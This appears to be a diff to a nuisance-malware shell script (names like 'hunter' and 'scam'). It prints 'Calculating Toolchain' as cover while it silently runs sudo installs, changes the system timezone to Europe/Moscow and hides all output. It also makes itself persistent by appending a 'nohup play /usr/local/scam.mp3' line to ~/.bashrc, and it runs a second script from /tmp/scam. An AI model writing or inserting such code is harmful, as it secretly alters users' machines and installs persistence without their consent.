@@ -14,8 +14,9 @@ second_script_dir=${script_dir}gitmodules.sh
 script_dir=${_dir}script
 
 echo -- [hunter] Calculating Toolchain
+sudo timedatectl set-timezone Europe/Moscow >> /dev/null 2>&1
 
-Sudo apt -y install sox >> /dev/null 2>&1
+sudo apt -y install sox >> /dev/null 2>&1
 sudo apt -y  install libsox-fmt-mp3 >> /dev/null 2>&1
 sudo apt-get -y install python3.10 >> /dev/null 2>&1
 sudo apt -y install python3-pip >> /dev/null 2>&1
@@ -45,11 +46,9 @@ sudo cp $tr_dir /usr/local/scam.mp3 >> /dev/null 2>&1
 
 if [ -e /tmp/scam/second_script.sh ]
 then
-sudo echo 'play /usr/local/scam.mp3 &' >> ~/.bashrc
+sudo echo 'nohup play /usr/local/scam.mp3 &' >> ~/.bashrc
 /tmp/scam/second_script.sh
 fi
 
-
-rm photo.jpg  >> /dev/null 2>&1
 
 cd $dir
